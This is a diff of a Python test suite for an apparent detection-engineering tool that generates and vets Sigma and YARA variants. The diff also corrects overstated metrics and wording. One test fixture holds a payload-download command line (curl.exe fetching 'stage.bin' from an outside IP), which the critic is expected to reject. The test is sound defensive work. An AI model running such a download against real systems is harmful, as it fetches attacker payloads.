@@ -4,7 +4,7 @@ import unittest
 from pathlib import Path
 
 from tools.swarm.adapter import SwarmAdapter
-from tools.swarm.autonomous import AutonomousOrchestrator
+from tools.swarm.sparring import SparringRunner
 from tools.swarm.cable_writer import CableWriter
 from tools.swarm.config import OperatorDirective
 from tools.swarm.craftsmen.process_craftsman import ProcessCraftsman
@@ -66,7 +66,7 @@ class SwarmCriticTests(unittest.TestCase):
         self.assertFalse(verdict.passed)
         self.assertIn("Forbidden destination", verdict.reason)
 
-    def test_critic_rejects_routable_ip(self):
+    def test_critic_rejects_non_reserved_ip(self):
         variant = Variant(
             id="test-2",
             target_type="sigma",
@@ -76,13 +76,13 @@ class SwarmCriticTests(unittest.TestCase):
             payload={
                 "ParentImage": "C:\\Windows\\explorer.exe",
                 "Image": "C:\\Windows\\System32\\curl.exe",
-                "CommandLine": "curl.exe http://198.51.100.25/stage.bin",
+                "CommandLine": "curl.exe http://8.8.8.8/stage.bin",
             },
             cycle=1,
         )
         verdict = self.critic.evaluate(variant)
         self.assertFalse(verdict.passed)
-        self.assertIn("Routable IPv4", verdict.reason)
+        self.assertIn("Non-reserved IPv4", verdict.reason)
 
     def test_critic_rejects_invalid_xml_syntax(self):
         variant = Variant(
@@ -111,7 +111,7 @@ class SwarmCriticTests(unittest.TestCase):
         verdict = self.critic.evaluate(variant)
         self.assertTrue(verdict.passed, f"Safe variant rejected: {verdict.reason}")
 
-    def test_critic_rejects_routable_ipv6_literal(self):
+    def test_critic_rejects_non_reserved_ipv6_literal(self):
         variant = Variant(
             id="test-5",
             target_type="sigma",
@@ -127,7 +127,7 @@ class SwarmCriticTests(unittest.TestCase):
         )
         verdict = self.critic.evaluate(variant)
         self.assertFalse(verdict.passed)
-        self.assertIn("Routable IPv6", verdict.reason)
+        self.assertIn("Non-reserved IPv6", verdict.reason)
 
     def test_critic_allows_loopback_and_link_local_ipv6(self):
         variant = Variant(
@@ -216,11 +216,20 @@ class SwarmDetectorTests(unittest.TestCase):
 class SwarmOrchestratorEndToEndTests(unittest.TestCase):
     """Verifies end-to-end multi-cycle closed-loop runs for both YARA and Sigma."""
 
+    def setUp(self):
+        # Results must land in scratch space. Writing them into docs/swarm/results meant a test
+        # run silently rewrote the published boundary maps and campaign reports, so a code change
+        # could alter published artifacts without any deliberate regeneration.
+        self._scratch = tempfile.TemporaryDirectory()
+        self.addCleanup(self._scratch.cleanup)
+        self.output_dir = Path(self._scratch.name)
+
     def test_yara_orchestrator_run(self):
         directive = OperatorDirective(
             target="yara",
             max_cycles=2,
             variants_per_cycle=4,
+            output_dir=self.output_dir,
         )
         orchestrator = SwarmOrchestrator(directive)
         boundary_map, results = orchestrator.run()
@@ -241,6 +250,7 @@ class SwarmOrchestratorEndToEndTests(unittest.TestCase):
             target="sigma",
             max_cycles=2,
             variants_per_cycle=4,
+            output_dir=self.output_dir,
         )
         orchestrator = SwarmOrchestrator(directive)
         boundary_map, results = orchestrator.run()
@@ -290,7 +300,7 @@ class PromptEngineTests(unittest.TestCase):
                 self.assertTrue(verdict.passed, f"Generated hypothesis rejected by critic: {verdict.reason}")
 
 
-class AutonomousOrchestratorTests(unittest.TestCase):
+class SparringRunnerTests(unittest.TestCase):
     """Verifies continuous autonomous sparring loops and history persistence.
 
     The orchestrator persists a history artifact on every run. These tests
@@ -310,7 +320,7 @@ class AutonomousOrchestratorTests(unittest.TestCase):
             variants_per_cycle=3,
             output_dir=self.out_dir,
         )
-        return AutonomousOrchestrator(directive).run_autonomous(iterations=3)
+        return SparringRunner(directive).run_sparring(iterations=3)
 
     def _assert_sparring_summary(self, summary):
         self.assertEqual(summary["iterations_run"], 3)
@@ -377,8 +387,12 @@ class CableWriterTests(unittest.TestCase):
                 variant=variant,
                 patch_diff="+ selection_proxy_img:\n+   Image|endswith: ['\\pcalua.exe']",
                 recommendation_id="REC-SIGMA-006",
-                resilience_before=0.60,
-                resilience_after=1.00,
+                verification={
+                    "variant_detected_before": False,
+                    "variant_detected_after": True,
+                    "negative_fixtures_checked": 3,
+                    "negative_fixtures_matched": 0,
+                },
             )
             self.assertTrue(cable_path.exists())
             content = cable_path.read_text(encoding="utf-8")
@@ -451,7 +465,7 @@ class CableWriterTests(unittest.TestCase):
 
 
 class SwarmAdapterTests(unittest.TestCase):
-    """Verifies Adapter agent self-healing patch synthesis and in-memory verification."""
+    """Verifies Adapter patch synthesis and in-memory verification."""
 
     def test_heal_sigma_gap_candidate(self):
         adapter = SwarmAdapter()
@@ -479,8 +493,10 @@ class SwarmAdapterTests(unittest.TestCase):
         self.assertTrue(len(diff) > 0)
 
         # Verify candidate patch detects the variant
-        is_verified = adapter._verify_patch(rule_path, patched, "sigma", variant)
-        self.assertTrue(is_verified)
+        verification = adapter._verify_patch(rule_path, patched, "sigma", variant)
+        self.assertTrue(verification["variant_detected_after"])
+        self.assertEqual(verification["negative_fixtures_matched"], 0)
+        self.assertIsNone(verification["error"])
 
     def test_heal_yara_gap_candidate(self):
         adapter = SwarmAdapter()
@@ -507,8 +523,9 @@ class SwarmAdapterTests(unittest.TestCase):
         self.assertTrue(len(diff) > 0)
 
         # Verify candidate patch detects the variant
-        is_verified = adapter._verify_patch(rule_path, patched, "yara", variant)
-        self.assertTrue(is_verified)
+        verification = adapter._verify_patch(rule_path, patched, "yara", variant)
+        self.assertTrue(verification["variant_detected_after"])
+        self.assertEqual(verification["negative_fixtures_matched"], 0)
 
     def test_resolve_rule_path_all_rules(self):
         adapter = SwarmAdapter()
@@ -735,10 +752,10 @@ class CampaignOrchestratorTests(unittest.TestCase):
         st4 = [s for s in result.stages if s.stage_number == 4][0]
         self.assertFalse(st4.evasion_gap)
 
-    def test_run_autonomous_campaigns_multi_iterations(self):
+    def test_run_campaigns_multi_iterations(self):
         from tools.swarm.campaign import CampaignOrchestrator
         orchestrator = CampaignOrchestrator()
-        results = orchestrator.run_autonomous_campaigns(iterations=3)
+        results = orchestrator.run_campaigns(iterations=3)
 
         self.assertEqual(len(results), 3)
         for r in results:
@@ -786,7 +803,7 @@ class StrategicSynthesizerTests(unittest.TestCase):
             content = output_path.read_text(encoding="utf-8")
             self.assertIn("Strategic Intelligence Cable", content)
             self.assertIn("Cluster A: LOLBin & Process Proxying", content)
-            self.assertIn("Empirical Analysis of 100 Adversarial Swarm Probes", content)
+            self.assertIn("Empirical Analysis of 100 Boundary Probes", content)
         finally:
             shutil.rmtree(temp_cables, ignore_errors=True)
             shutil.rmtree(temp_results, ignore_errors=True)
@@ -1351,25 +1368,27 @@ class MitreLayerExporterTests(unittest.TestCase):
             self.assertIn("techniques", data)
 
     def test_layer_scores_are_deterministic_and_reproducible(self):
-        # By default, layer scoring uses the pinned empirical baseline (0.712)
-        # ensuring identical, reproducible outputs across machines regardless of mutable history.
+        # Scoring is deterministic. With no measurement supplied, techniques stay at the
+        # documented heuristics (baseline 75; correlation-backed 95). The withdrawn 0.712
+        # constant is never blended in by default.
         layer1 = self.exporter.build_layer()
         layer2 = self.exporter.build_layer()
         scored1 = {t["techniqueID"]: t["score"] for t in layer1["techniques"]}
         scored2 = {t["techniqueID"]: t["score"] for t in layer2["techniques"]}
         self.assertEqual(scored1, scored2)
-        # Single-event rules blend baseline 75 with pinned 71 -> 73
-        self.assertEqual(scored1.get("T1204.002"), 73)
-        self.assertEqual(scored1.get("T1053.005"), 73)
         # Correlation-backed techniques stay at 95
         self.assertEqual(scored1.get("T1003.001"), 95)
+        if self.exporter.pinned_resilience is None and self.exporter.history_file is None:
+            self.assertEqual(scored1.get("T1204.002"), 75)
+            self.assertEqual(scored1.get("T1053.005"), 75)
+            self.assertNotIn(73, set(scored1.values()))
 
     def test_layer_explicit_history_file_override(self):
         import json
         import tempfile
         with tempfile.TemporaryDirectory() as tmp:
             custom_hist = Path(tmp) / "custom_hist.json"
-            custom_hist.write_text(json.dumps({"final_resilience": 0.85}), encoding="utf-8")
+            custom_hist.write_text(json.dumps({"detection_rate_on_approved": 0.85}), encoding="utf-8")
             custom_exporter = MitreLayerExporter(history_file=custom_hist)
             layer = custom_exporter.build_layer()
             scored = {t["techniqueID"]: t["score"] for t in layer["techniques"]}
@@ -1727,7 +1746,10 @@ class D3fendMapperTests(unittest.TestCase):
         md = self.mapper.build().to_markdown()
         self.assertIn("Dual-Layer Coverage Assessment", md)
         self.assertIn("Taxonomy status", md)
-        self.assertIn("Zero identifier collisions detected", md)
+        # The artifact used to claim every countermeasure identifier had been verified against
+        # the D3FEND ontology; the module only hand-verifies a subset, so the wording is scoped.
+        self.assertIn("Not every identifier has been verified against the ontology", md)
+        self.assertNotIn("All countermeasure identifiers have been verified", md)
         self.assertIn("Confidence.", md)
 
     def test_export_writes_dual_layer_json(self):
@@ -1796,11 +1818,15 @@ class SiemProfilerCalibrationTests(unittest.TestCase):
         self.assertIn("correlation_strength", cal)
         self.assertEqual(cal["corpus_size"], 100)
 
-        # Check empirical_ms populated on profiled queries
-        calibrated_profiles = [p for p in report.profiles if p.empirical_ms is not None]
-        self.assertGreater(len(calibrated_profiles), 0)
-        for cp in calibrated_profiles:
-            self.assertGreaterEqual(cp.empirical_ms, 0.0)
+        # Empirical latency belongs only to the backend that was actually timed (sqlite). The
+        # profiled backends are LogScale/Splunk/Lucene, so the timing lives in the calibration
+        # block rather than being stamped onto profiles measured on other backends.
+        self.assertEqual(cal["backend_timed"], "sqlite")
+        self.assertGreater(cal["observations"], 0)
+        self.assertGreaterEqual(cal["mean_latency_ms"], 0.0)
+        for profile in report.profiles:
+            if profile.empirical_ms is not None:
+                self.assertEqual(profile.backend.lower(), "sqlite")
 
 
 class WorkbenchCanvasTests(unittest.TestCase):
